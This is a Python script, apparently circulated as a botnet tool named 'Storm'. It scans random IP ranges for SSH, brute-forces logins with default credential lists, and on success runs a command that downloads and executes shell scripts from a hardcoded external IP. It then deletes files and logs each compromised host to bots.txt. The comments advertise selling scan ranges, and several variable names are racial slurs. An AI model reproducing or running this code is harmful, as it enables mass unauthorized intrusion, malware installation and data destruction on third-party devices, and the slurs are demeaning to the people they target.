#!/usr/bin/env python

# Step 1 - ulimit -n 999999
# Step 2- python storm.py 500 ROOT 1 1 or  python storm.py 500 LUCKY3 1 1
#You can buy more ranges (191 186 dm me for more
#@StormyServices or @Cayote

import threading, paramiko, random, socket, time, sys

paramiko.util.log_to_file("/dev/null")


blacklist = [
    '127'
]


passwords = [ 
  "telnet:telnet"
  "admin:1234",
  "root:root",
  "root:admin",
  "user:user",
  "guest:guest",
  "admin:admin"
  
]

if sys.argv[4] == '1':
     passwords = ["root:root"] 
if sys.argv[4] == '2':
     passwords = ["guest:guest"] 
if sys.argv[4] == '3':
     passwords = ["admin:1234"] 
if sys.argv[4] == '4':
     passwords = ["telnet:telnet"] 
if sys.argv[4] == '5':
	passwords = ["root:root", "admin:1234"]
if sys.argv[4] == '6':
	passwords = ["root:root", "admin:admin", "root:admin", "admin:1234"]	
if sys.argv[4] == '7':
	passwords = ["root:admin", "root:root", "admin:1234", "admin:password", "cisco:cisco", "netgear:netgear", "cusadmin:password", "admin:admin", "user:user", "test:test", "admin:12345", "admin:123456", "guest:guest", "root:password"]
if sys.argv[4] == '8':
    passwords = ["root:root", "root:admin"]
if sys.argv[4] == '9':
    passwords = ["root:root", "admin:1234", "root:admin", "user:user", "test:test"]
if sys.argv[4] == 'perl':
    passwords = [ "pi:raspberry", "vagrant:vagrant", "ubnt:ubnt" ] 
if sys.argv[4] == 'vps':
	passwords = [ "root:maxided", "root:centos6svm", "root:123456", "root:Zero", "root:Password"] 
if sys.argv[4] == 'vps2':
	passwords = [ "root:maxided", "root:centos6svm", "root:1234", "root:qwerty", "root:dragon", "root:pussy", "root:baseball"]
	
print "\x1b[32mStorm Has Been Executed..."
print "\x1b[31mStorm Is Activating"
time.sleep(1)
print "\x1b[32mStorm Has Been Activated"

ipclassinfo = sys.argv[2]
if ipclassinfo == "A":
    ip1 = sys.argv[3]
elif ipclassinfo == "B":
    ip1 = sys.argv[3].split(".")[0]
    ip2 = sys.argv[3].split(".")[1]
elif ipclassinfo == "C":
    ips = sys.argv[3].split(".")
    num=0
    for ip in ips:
        num=num+1
        if num == 1:
            ip1 = ip
        elif num == 2:
            ip2 = ip
        elif num == 3:
            ip3 = ip
class sshscanner(threading.Thread):
    global passwords
    global ipclassinfo
    if ipclassinfo == "A":
        global ip1
    elif ipclassinfo == "B":
        global ip1
        global ip2
    elif ipclassinfo == "C":
        global ip1
        global ip2
        global ip3
    def run(self):
        while 1:
            try:
                while 1:
                    thisipisbad='no'
                    if ipclassinfo == "A":
                        self.host = ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    if ipclassinfo == "B":
                        self.host = ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    if ipclassinfo == "C":
                        self.host = ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
                    if  ipclassinfo == "49":
                        hAZZYE = ["49.144","49.145","49.146","49.147","49.148","49.149","49.150","49.151","49.228"]
                        self.host = random.choice(hAZZYE)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    if  ipclassinfo == "122":
                        Nigger = ["122.3","122.2","122.52","122.54","122.174","122.237","122.176","122.166","122.172","122.163","122.179"]
                        self.host = random.choice(Nigger)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    if  ipclassinfo == "NIGGER":
                        Beaner = ["186.232","186.119","186.39","122.164","186.59","131.255","186.250","200.33","186.57","186.61","186.134","186.128"]
                        self.host = random.choice(Beaner)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    if  ipclassinfo == "119":
                        SHIT = ["119.91","119.92","119.93","119.94","119.95"]
                        self.host = random.choice(SHIT)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    if ipclassinfo == "FAST_1":
                        fast1 = fast1 = [ "5.78","1.20","122.170","122.164","201.176","200.33","131.255" ]
			self.host = random.choice(fast1)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    if ipclassinfo == "FAST_2":
                        fast = fast = [ "59.69","124.107","112.209","49.228","49.150","49.149","122.2" ]
			self.host = random.choice(fast)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    if ipclassinfo == "FAST_3":
                        fast3 = fast3 = [ "12.188","14.162","14.33","13.92","103.57","14.67","14.177" ]
			self.host = random.choice(fast3)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    if ipclassinfo == "ADMIN":
                        fast3 = fast3 = [ "31.23","2.60","188.114","49.79","122.58","201.71" ]
			self.host = random.choice(fast3)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    if ipclassinfo == "ROOT":
                        fast5 = fast5 = [ "186.59","186.61","186.114","186.39","186.128","186.133" ]
			self.host = random.choice(fast5)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    if ipclassinfo == "190":
                        fast5 = fast5 = [ "190.174","190.175","190.173","190.172","190.176","190.177" ]
			self.host = random.choice(fast5)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    if ipclassinfo == "191":
                        fast5 = fast5 = [ "191.80","191.81","191.82","191.83","191.84","191.85" ]
			self.host = random.choice(fast5)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    if ipclassinfo == "112":#"179.40","179.39","179.38","179.37","179.36"
                        fast5 = fast5 = [ "112.206","112.205","112.203","112.202","112.201" ]
			self.host = random.choice(fast5)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    if ipclassinfo == "179":#"179.40","179.39","179.38","179.37","179.36"
                        fast5 = fast5 = [ "179.40","179.39","179.38","179.37","179.36" ]
			self.host = random.choice(fast5)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    if ipclassinfo == "LUCKY3":
                        lucky3 = [ "188.245", "181.20", "181.24", "186.128", "186.132", "186.39", "186.56", "186.57", "186.58", "186.60" ]
			self.host = random.choice(lucky3)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LRAB":
                        lrabz = ["122","186","119","168"]
                        self.host = random.choice(lrabz)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY":
                        lucky = ["125.27","101.109","113.53","118.173","122.170","122.180","46.62","5.78","101.108","1.20","125.25","125.26","182.52","118.172","118.174","118.175","125.24","180.180"]
                        self.host = random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY1":
                        lucky1 = ["125.27","101.109","113.53","118.173","122.170","122.180","46.62","5.78","1.20"]
                        self.host = random.choice(lucky1)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY2":
                        lucky2 = lucky2 = [ "122.3","210.213","59.69","122.52","122.54","119.93","124.105","125.104","119.92","119.91" ]
			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY22":
                        lucky22 = lucky22 = [ "122.3","210.213","59.69","122.52","122.54","119.93","124.105","125.104","119.92","119.91","49.144","49.145","49.146","49.147","49.148","49.149","49.150","180.180" ]
			self.host = random.choice(lucky22)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    for badip in blacklist:
                        if badip in self.host:
                            thisipisbad='yes'
                    if thisipisbad=='no':
                        break
                username='root'
                password=""
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.host, port))
                s.close()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
                        ssh.connect(self.host, port = port, username=username, password=password, timeout=1)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                output = stdout.read()
                if "inet addr" in output:
                    badserver=False
                if badserver == False:
                        print '\x1b[31mScanning IP~>\x1b[34m '+self.host+'|'+username+'|'+password+'|'+str(port)
			ssh.exec_command("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; tftp 87.121.98.51 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 87.121.98.51; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 87.121.98.51 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *")
			nigger = open("bots.txt", "a").write(username + ":" + password + ":" + self.host + "\n")
                        ssh.close()
                        time.sleep(10)	

                      
            except:
                pass

for x in range(0,int(sys.argv[1])):
    try:
        t = sshscanner()
        t.start()
    except:
        pass